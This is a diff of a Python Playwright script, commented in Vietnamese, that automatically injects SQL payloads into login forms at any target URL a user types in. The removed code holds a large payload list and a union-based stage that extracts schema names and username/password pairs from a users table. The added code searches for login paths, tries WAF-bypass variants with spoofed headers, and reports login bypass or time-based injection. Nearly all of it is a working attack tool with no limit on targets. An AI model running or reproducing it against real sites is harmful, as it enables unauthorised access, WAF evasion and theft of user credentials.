@@ -2,82 +2,68 @@ import time
 import signal
 import sys
 import logging
-import random
 from playwright.sync_api import sync_playwright, Playwright
 from playwright._impl._errors import TimeoutError
 
 # Thiết lập logging
-logging.basicConfig(filename='sqli_exploit.log', level=logging.INFO, format='%(asctime)s - %(message)s')
+logging.basicConfig(filename='sqli_scan.log', level=logging.INFO, format='%(asctime)s - %(message)s')
 
-# Danh sách các payload SQLi mở rộng (lấy cảm hứng từ SecLists và các nguồn phổ biến)
+# Danh sách payloads SQLi chính
 SQLI_PAYLOADS = [
-    # Generic SQLi Payloads
-    "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #", "' OR 1=1 --",
-    "1' AND 1=1 --", "1' AND 1=2 --", "' OR 'a'='a", "' OR 'a'='a' --",
-    "admin' --", "admin' #", "admin'/*", "' OR ''='", "' OR 1=1/*",
-    "' OR 1=1 LIMIT 1 --", "' OR 1=1 ORDER BY 1 --", "' OR 1=1 UNION SELECT 1 --",
-    "' AND 1=2 UNION SELECT 1,2 --", "' AND 1=2 UNION SELECT 1,2,3 --",
-    "' OR '1'='1' AND '1'='1", "' OR '1'='1' AND SLEEP(5) --",
-
-    # Union-based SQLi Payloads
-    "' UNION SELECT NULL --", "' UNION SELECT NULL, NULL --", "' UNION SELECT NULL, NULL, NULL --",
-    "' UNION SELECT 1,2 --", "' UNION SELECT 1,2,3 --", "' UNION SELECT 1,2,3,4 --",
-    "' UNION SELECT @@version, NULL --", "' UNION SELECT user(), NULL --",
-    "' UNION SELECT database(), NULL --", "' UNION SELECT schema_name, NULL FROM information_schema.schemata --",
-    "' UNION SELECT table_name, NULL FROM information_schema.tables --",
-    "' UNION SELECT column_name, NULL FROM information_schema.columns --",
-
-    # Error-based SQLi Payloads
-    "1' AND 1=CONVERT(int, (SELECT @@version)) --",
-    "1' AND 1=CAST((SELECT @@version) AS int) --",
-    "1' AND 1=(SELECT COUNT(*) FROM information_schema.tables) --",
-    "1' AND 1=EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) --",
-    "1' AND 1=UPDATEXML(1, CONCAT(0x7e, (SELECT @@version), 0x7e), 1) --",
-    "' AND 1=2 OR 1=EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e)) --",
-
-    # Time-based SQLi Payloads
-    "1' AND SLEEP(5) --", "1' AND IF(1=1, SLEEP(5), 0) --",
-    "1' AND (SELECT 1 FROM dual WHERE SLEEP(5)) --", "1' AND BENCHMARK(5000000, MD5(1)) --",
-    "1' AND IF(1=1, BENCHMARK(5000000, MD5(1)), 0) --", "' OR SLEEP(5) --",
-    "' OR IF(1=1, SLEEP(5), 0) --", "' OR (SELECT 1 FROM dual WHERE SLEEP(5)) --",
-
-    # Blind SQLi Payloads (Boolean-based)
-    "1' AND 1=1 --", "1' AND 1=2 --", "' AND SUBSTRING((SELECT @@version), 1, 1)='5' --",
-    "' AND (SELECT LENGTH(database()))=7 --", "' AND (SELECT SUBSTRING((SELECT database()), 1, 1))='v' --",
-    "' AND (SELECT ASCII(SUBSTRING((SELECT database()), 1, 1)))=118 --",
-    "' AND 1=(SELECT IF(1=1, 1, 0)) --", "' AND 1=(SELECT IF(1=2, 1, 0)) --",
-
-    # Additional Payloads (lấy cảm hứng từ SecLists)
-    "1; DROP TABLE users --", "1' OR EXISTS(SELECT * FROM users) --",
-    "1' OR (SELECT COUNT(*) FROM information_schema.tables)>0 --",
-    "' OR (SELECT 1 FROM information_schema.tables WHERE table_schema=database() LIMIT 1)=1 --",
-    "1' OR (SELECT 1 FROM dual WHERE database() LIKE 'v%') --",
-    "' OR (SELECT 1 FROM information_schema.columns WHERE table_name='users')=1 --",
-    "' OR 1=(SELECT 1 FROM information_schema.tables WHERE table_schema='mysql') --",
-    "1' AND 1=(SELECT 1 FROM information_schema.tables WHERE table_schema='mysql' AND table_name='user') --",
+    "' OR '1'='1", "' OR 1=1 -- ", "' OR 1=1 #", "admin' OR '1'='1",
+    "1' UNION SELECT NULL, NULL -- ", "' AND SLEEP(5) -- ", "' OR SLEEP(5) -- ",
+    "1' WAITFOR DELAY '0:0:5' -- ", "' AND 1=CONVERT(int,@@version) -- "
 ]
 
-# Danh sách các payload khai thác Union-based SQLi (mở rộng)
-UNION_PAYLOADS = [
-    "UNION SELECT database(), NULL --",  # Lấy tên database
-    "UNION SELECT user(), NULL --",  # Lấy user hiện tại
-    "UNION SELECT @@version, NULL --",  # Lấy phiên bản MySQL
-    "UNION SELECT schema_name, NULL FROM information_schema.schemata --",  # Lấy danh sách schema
-    "UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() --",  # Lấy danh sách bảng
-    "UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='mysql' --",  # Lấy bảng từ schema 'mysql'
-    "UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --",  # Lấy danh sách cột của bảng users
-    "UNION SELECT username, password FROM users --",  # Lấy dữ liệu từ bảng users
-    "UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database() --",  # Lấy bảng và cột
-    "UNION SELECT group_concat(table_name), NULL FROM information_schema.tables WHERE table_schema=database() --",  # Lấy tất cả bảng
-    "UNION SELECT group_concat(column_name), NULL FROM information_schema.columns WHERE table_name='users' --",  # Lấy tất cả cột
-    "UNION SELECT group_concat(username, ':', password), NULL FROM users --",  # Lấy username và password
+# Các biến thể payload để bypass WAF
+WAF_BYPASS_PAYLOADS = {
+    "' AND SLEEP(5) -- ": [
+        "' AND SLEEP(5) -- ",
+        "' and sleep(5) -- ",
+        "' AND SLEEP(5)/*comment*/",
+        "' AND IF(1=1, SLEEP(5), 0) -- ",
+        "' AND SLEEP(5) %2D%2D",
+        "' AND SLEEP(5) --+"
+    ],
+    "' OR SLEEP(5) -- ": [
+        "' OR SLEEP(5) -- ",
+        "' or sleep(5) -- ",
+        "' OR SLEEP(5)/*comment*/",
+        "' OR IF(1=1, SLEEP(5), 0) -- ",
+        "' OR SLEEP(5) %2D%2D",
+        "' OR SLEEP(5) --+"
+    ],
+    "1' WAITFOR DELAY '0:0:5' -- ": [
+        "1' WAITFOR DELAY '0:0:5' -- ",
+        "1' waitfor delay '0:0:5' -- ",
+        "1' WAITFOR DELAY '0:0:5'/*comment*/",
+        "1' IF(1=1, WAITFOR DELAY '0:0:5', 0) -- ",
+        "1' WAITFOR DELAY '0:0:5' %2D%2D",
+        "1' WAITFOR DELAY '0:0:5' --+"
+    ]
+}
+
+# Các lỗi SQL phổ biến để phát hiện SQLi
+SQLI_ERRORS = [
+    "error in your SQL syntax", "mysql_", "SQLSTATE[", "unclosed quotation",
+    "Incorrect syntax near", "sqlite_", "ORA-", "PostgreSQL", "DB2 SQL"
 ]
 
-# Biến toàn cục để theo dõi trạng thái quét
+# Các dấu hiệu đăng nhập thành công
+LOGIN_SUCCESS_INDICATORS = [
+    "welcome", "dashboard", "logout", "profile", "success", "logged in"
+]
+
+# Các dấu hiệu bị WAF chặn
+WAF_INDICATORS = [
+    "forbidden", "blocked", "access denied", "403"
+]
+
+# Biến toàn cục
 stop_scanning = False
 results_found = []
 
-# Xử lý tín hiệu dừng (Ctrl+C)
+# Xử lý Ctrl+C
 def signal_handler(sig, frame):
     global stop_scanning
     print("\n[!] Stopping scan...")
@@ -90,217 +76,213 @@ def signal_handler(sig, frame):
 
 signal.signal(signal.SIGINT, signal_handler)
 
-# Kiểm tra phản hồi để phát hiện lỗ hổng SQLi
-def check_sqli_response(response_text, original_response_text):
-    # Kiểm tra các dấu hiệu lỗi SQL
-    error_indicators = [
-        "mysql_fetch", "SQL syntax", "You have an error in your SQL syntax",
-        "mysql_num_rows", "sql error", "unexpected end of SQL",
-        "ODBC SQL Server Driver", "SQL Server", "Microsoft OLE DB Provider",
-        "SQLSTATE", "unclosed quotation mark", "incorrect syntax"
-    ]
-    for indicator in error_indicators:
-        if indicator.lower() in response_text.lower():
-            return True, "Error-based SQLi detected"
+# Hàm quét path ban đầu
+def scan_initial_paths(target):
+    valid_paths = []
+    print(f"\n[*] Scanning initial paths on {target}...")
+    
+    with sync_playwright() as playwright:
+        browser = playwright.chromium.launch(headless=True)
+        context = browser.new_context(ignore_https_errors=True)
+        page = context.new_page()
 
-    # Kiểm tra sự khác biệt trong phản hồi (so với phản hồi gốc)
-    if response_text != original_response_text:
-        return True, "Potential SQLi detected (response differs)"
+        try:
+            page.goto(target, timeout=15000)
+            default_content = page.content()
+            print(f"[*] Default content loaded from {target}")
+        except TimeoutError:
+            print(f"[!] Timeout loading default content from {target}")
+            default_content = ""
+            browser.close()
+            return valid_paths
 
-    # Kiểm tra các từ khóa liên quan đến dữ liệu rò rỉ (cho Union-based)
-    data_leak_indicators = ["database()", "information_schema", "users", "admin", "mysql", "schema_name", "table_name", "column_name"]
-    for indicator in data_leak_indicators:
-        if indicator.lower() in response_text.lower():
-            return True, "Union-based SQLi detected"
+        login_paths = ["/login", "/login.php", "/signin", "/auth"]
+        for path in login_paths:
+            full_url = f"{target.rstrip('/')}{path}"
+            try:
+                page.goto(full_url, timeout=15000)
+                content = page.content()
+                if content and ("form" in content.lower() or page.query_selector("form")):
+                    print(f"[+] Found login path: {path}")
+                    valid_paths.append(full_url)
+                else:
+                    print(f"[-] No login form found at {path}")
+            except TimeoutError:
+                print(f"[-] Timeout or inaccessible: {path}")
+            except Exception as e:
+                print(f"[-] Error on {path}: {e}")
 
-    return False, None
+        browser.close()
+    return valid_paths
 
-# Tự động khai thác SQLi bằng Playwright
-def auto_exploit_sqli(playwright: Playwright, login_url, max_retries=3):
+# Hàm kiểm tra SQLi trên form với khả năng bypass WAF
+def exploit_sqli(playwright, url):
     global stop_scanning
     browser = None
     try:
-        browser = playwright.chromium.launch(headless=False)  # Mở Chrome để quan sát
+        browser = playwright.chromium.launch(headless=True)
         context = browser.new_context(
             ignore_https_errors=True,
-            viewport={"width": 1280, "height": 720}
+            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+            extra_http_headers={
+                "Referer": url,
+                "Accept": "text/html",
+                "X-Requested-With": "XMLHttpRequest",
+                "Sec-Fetch-Site": "same-origin",
+                "Sec-Fetch-Mode": "navigate",
+                "Sec-Fetch-Dest": "document"
+            }
         )
-        for attempt in range(max_retries):
-            try:
-                page = context.new_page()
+        page = context.new_page()
 
-                # 1. Lấy phản hồi gốc để so sánh
-                print(f"[*] Opening Chrome to login at {login_url} (Attempt {attempt + 1}/{max_retries})...")
-                page.goto(login_url)
+        for sqli_payload in SQLI_PAYLOADS:
+            print(f"[*] Testing SQLi with payload: {sqli_payload} on {url}...")
+            # Nếu payload có biến thể để bypass WAF, lấy danh sách biến thể
+            payloads_to_test = WAF_BYPASS_PAYLOADS.get(sqli_payload, [sqli_payload])
 
-                # Điền dữ liệu gốc (không chứa payload SQLi)
-                print("[*] Entering original data for baseline comparison...")
-                page.wait_for_selector("input[name='uname']", timeout=60000)
-                page.fill("input[name='uname']", "test")
-                time.sleep(1)  # Delay 1 giây
-                page.wait_for_selector("input[name='pass']", timeout=60000)
-                page.fill("input[name='pass']", "test")
-                time.sleep(1)  # Delay 1 giây
-                page.wait_for_selector("input[type='submit']", timeout=60000)
-                page.click("input[type='submit']")
-                time.sleep(2)  # Delay 2 giây để chờ phản hồi
-                original_response_text = page.content()
-
-                # 2. Kiểm tra từng payload SQLi
-                for payload in SQLI_PAYLOADS:
-                    if stop_scanning:
+            for payload in payloads_to_test:
+                # Retry logic cho mỗi payload
+                for attempt in range(3):
+                    try:
+                        print(f"[*] Opening Chrome to login at {url} (Attempt {attempt + 1}/3) with payload: {payload}...")
+                        page.goto(url, timeout=30000)
+                        page.wait_for_load_state("networkidle", timeout=30000)
+                        print(f"[*] Page loaded successfully (Attempt {attempt + 1}/3)")
                         break
-                    print(f"[*] Testing SQLi payload: {payload}")
+                    except TimeoutError:
+                        print(f"[!] Timeout loading {url} (Attempt {attempt + 1}/3)")
+                        if attempt == 2:
+                            print(f"[!] Failed to load {url} after 3 attempts, skipping payload {payload}")
+                            continue
+                        time.sleep(2)
+                    except Exception as e:
+                        print(f"[!] Error loading page (Attempt {attempt + 1}/3): {e}")
+                        if attempt == 2:
+                            print(f"[!] Failed to load {url} after 3 attempts, skipping payload {payload}")
+                            continue
+                        time.sleep(2)
 
-                    # Tải lại trang để nhập payload mới
-                    page.goto(login_url)
+                # Kiểm tra và điền dữ liệu
+                try:
+                    print(f"[*] Waiting for form elements on {url}...")
+                    username_input = page.wait_for_selector("input[name='username']", state="visible", timeout=15000)
+                    password_input = page.wait_for_selector("input[name='password']", state="visible", timeout=15000)
+                    submit_button = page.wait_for_selector("button[type='submit']", state="visible", timeout=15000)
+                    print(f"[*] Form elements found: username={username_input is not None}, password={password_input is not None}, submit={submit_button is not None}")
 
-                    # Điền payload SQLi vào form đăng nhập (chậm rãi)
-                    print("[*] Entering username...")
-                    page.wait_for_selector("input[name='uname']", timeout=60000)
-                    page.fill("input[name='uname']", payload)
-                    time.sleep(1)  # Delay 1 giây
-                    print("[*] Entering password...")
-                    page.wait_for_selector("input[name='pass']", timeout=60000)
-                    page.fill("input[name='pass']", payload)
-                    time.sleep(1)  # Delay 1 giây
-                    print("[*] Clicking login button...")
-                    page.wait_for_selector("input[type='submit']", timeout=60000)
-                    page.click("input[type='submit']")
-                    time.sleep(2)  # Delay 2 giây để chờ phản hồi
+                    # Xử lý phản hồi để lấy mã trạng thái
+                    response = None
+                    def handle_response(resp):
+                        nonlocal response
+                        response = resp
 
-                    # Kiểm tra phản hồi
-                    response_text = page.content()
-                    is_vulnerable, vuln_type = check_sqli_response(response_text, original_response_text)
-                    if is_vulnerable:
-                        result = f"[!!!] SQLi Vulnerability Found!\nPayload: {payload}\nType: {vuln_type}\nURL: {login_url}"
+                    page.on("response", handle_response)
+
+                    print(f"[*] Entering payload: {payload}...")
+                    page.fill("input[name='username']", payload)
+                    page.fill("input[name='password']", "password123")
+                    print(f"[*] Submitting form...")
+                    
+                    # Đo thời gian submit
+                    start_time = time.time()
+                    page.click("button[type='submit']")
+                    page.wait_for_load_state("networkidle", timeout=10000)
+                    elapsed_time = time.time() - start_time
+
+                    # Kiểm tra mã trạng thái HTTP
+                    if response:
+                        status = response.status
+                        print(f"[*] HTTP Status: {status}")
+                        if status == 403:
+                            print(f"[!] WAF detected: Forbidden (Payload: {payload})")
+                            continue  # Thử payload khác trong danh sách biến thể
+
+                    # Kiểm tra nội dung phản hồi
+                    content = page.content().lower()
+                    if any(indicator in content for indicator in WAF_INDICATORS):
+                        print(f"[!] WAF detected: Content indicates block (Payload: {payload})")
+                        continue  # Thử payload khác trong danh sách biến thể
+
+                    # Kiểm tra các dấu hiệu SQLi
+                    if any(error in content for error in SQLI_ERRORS):
+                        result = f"[!!!] SQLi found with {payload} at {url} (Error-based)"
                         print(result)
-                        logging.info(result)
                         results_found.append(result)
-
-                        # Nếu phát hiện Union-based SQLi, thử khai thác
-                        if "Union-based" in vuln_type:
-                            exploit_sqli_union(page, login_url, payload)
-                        stop_scanning = True
+                        logging.info(result)
                         return True
+                    elif any(indicator in content for indicator in LOGIN_SUCCESS_INDICATORS):
+                        result = f"[!!!] SQLi found with {payload} at {url} (Bypass login)"
+                        print(result)
+                        results_found.append(result)
+                        logging.info(result)
+                        return True
+                    elif "SLEEP" in payload or "DELAY" in payload:
+                        if elapsed_time >= 4:  # Delay đáng kể
+                            result = f"[!!!] SQLi found with {payload} at {url} (Time-based) (Response time: {elapsed_time}s)"
+                            print(result)
+                            results_found.append(result)
+                            logging.info(result)
+                            return True
+                        else:
+                            print(f"[-] No delay detected (Response time: {elapsed_time}s)")
 
-            except TimeoutError as e:
-                print(f"[!] Timeout during login/exploitation (Attempt {attempt + 1}/{max_retries}): {e}")
-                if attempt < max_retries - 1:
-                    print("[*] Retrying...")
-                    if page:
-                        page.close()
+                except TimeoutError as e:
+                    print(f"[!] Timeout waiting for form elements: {e}")
                     continue
-                print(f"[!!!] SQLi may exist but could not be confirmed at {login_url} (check manually)")
-                result = f"[!!!] SQLi may exist but could not be confirmed at {login_url} (check manually)."
-                print(result)
-                results_found.append(result)
-                logging.info(result)
-                stop_scanning = True
-                return False
-            except Exception as e:
-                print(f"[!] Error during login/exploitation (Attempt {attempt + 1}/{max_retries}): {e}")
-                if attempt < max_retries - 1:
-                    print("[*] Retrying...")
-                    if page:
-                        page.close()
+                except Exception as e:
+                    print(f"[!] Error processing form: {e}")
                     continue
-                print(f"[!!!] SQLi may exist but could not be confirmed at {login_url} (check manually)")
-                result = f"[!!!] SQLi may exist but could not be confirmed at {login_url} (check manually)."
-                print(result)
-                results_found.append(result)
-                logging.info(result)
-                stop_scanning = True
-                return False
 
-        return False  # Nếu không thành công sau tất cả các lần thử
+        return False
 
+    except Exception as e:
+        print(f"[!] Error testing SQLi on {url}: {e}")
+        return False
     finally:
         if browser:
-            print("[*] Closing Chrome browser...")
             browser.close()
 
-# Khai thác Union-based SQLi
-def exploit_sqli_union(page, login_url, base_payload):
-    print("[*] Attempting to exploit Union-based SQLi...")
-    for exploit_payload in UNION_PAYLOADS:
-        payload = f"{base_payload.split('UNION')[0]} {exploit_payload}"
-        print(f"[*] Exploiting with payload: {payload}")
-
-        # Tải lại trang để nhập payload khai thác
-        page.goto(login_url)
-
-        # Điền payload khai thác (chậm rãi)
-        print("[*] Entering username...")
-        page.wait_for_selector("input[name='uname']", timeout=60000)
-        page.fill("input[name='uname']", payload)
-        time.sleep(1)  # Delay 1 giây
-        print("[*] Entering password...")
-        page.wait_for_selector("input[name='pass']", timeout=60000)
-        page.fill("input[name='pass']", payload)
-        time.sleep(1)  # Delay 1 giây
-        print("[*] Clicking login button...")
-        page.wait_for_selector("input[type='submit']", timeout=60000)
-        page.click("input[type='submit']")
-        time.sleep(2)  # Delay 2 giây để chờ phản hồi
-
-        # Kiểm tra dữ liệu rò rỉ trong phản hồi
-        response_text = page.content().lower()
-        data_leak_indicators = ["database()", "information_schema", "users", "admin", "mysql", "schema_name", "table_name", "column_name"]
-        for indicator in data_leak_indicators:
-            if indicator.lower() in response_text:
-                result = f"[!!!] Data Extracted!\nPayload: {payload}\nResponse: {response_text[:500]}..."
-                print(result)
-                logging.info(result)
-                with open("sqli_results.txt", "a") as f:
-                    f.write(result + "\n")
-                break
-
-# Hàm chính để quét SQLi
-def scan_sqli(url, max_time=600):
+# Hàm quét tự động
+def auto_exploit(target, paths, max_time=600):
     global stop_scanning
     start_time = time.time()
-    print(f"\n[*] Scanning for SQL Injection on {url} (Max time: {max_time} seconds)")
+    print(f"\n[*] Starting SQLi scan on {target} (Max time: {max_time}s)...")
 
-    # Chỉ quét trên login.php
-    login_url = f"{url.rstrip('/')}/login.php"
-
-    # Sử dụng Playwright để tự động quét
     with sync_playwright() as playwright:
-        if auto_exploit_sqli(playwright, login_url):
-            print("[*] SQLi exploitation completed.")
+        for path in paths:
+            if stop_scanning or time.time() - start_time > max_time:
+                break
+            print(f"\n[*] Testing path: {path}")
+            exploit_sqli(playwright, path)
 
     if results_found:
         with open("sqli_results.txt", "a") as f:
             for result in results_found:
                 f.write(result + "\n")
 
-# Hàm quét SQLi và hiển thị menu
+# Menu chính
 def scan_sqli_and_continue():
+    global stop_scanning
     while True:
-        stop_scanning = False  # Reset trạng thái quét
-        results_found.clear()  # Reset danh sách kết quả
+        stop_scanning = False
+        results_found.clear()
 
-        target_url = input("Enter target URL to scan for SQLi (e.g., http://example.com/): ")
-        scan_sqli(target_url)
-
-        # Hiển thị menu hỏi người dùng
-        print("\nScan completed!")
-        print("Would you like to continue scanning another URL or exit?")
-        print("1. Scan another URL")
-        print("2. Exit")
-        choice = input("Enter your choice (1 or 2): ")
-
-        if choice == "1":
-            continue  # Tiếp tục vòng lặp để quét URL mới
-        elif choice == "2":
-            print("[*] Exiting program...")
-            sys.exit(0)  # Thoát chương trình
+        target_url = input("Enter target URL to scan for SQLi (e.g., https://example.com/): ")
+        valid_paths = scan_initial_paths(target_url)
+        
+        if valid_paths:
+            print(f"\n[*] Found {len(valid_paths)} login paths. Starting SQLi scan...")
+            auto_exploit(target_url, valid_paths)
         else:
-            print("[!] Invalid choice. Exiting program...")
+            print("[!] No login paths found. Scan skipped.")
+
+        print("\nScan completed!")
+        print("1. Scan another URL\n2. Exit")
+        choice = input("Choice (1 or 2): ")
+        if choice != "1":
+            print("[*] Exiting...")
             sys.exit(0)
 
-# Chạy chương trình
 if __name__ == "__main__":
     print("=== SQL Injection Scanner (Playwright Automation with Extended Payloads) ===")
     scan_sqli_and_continue()
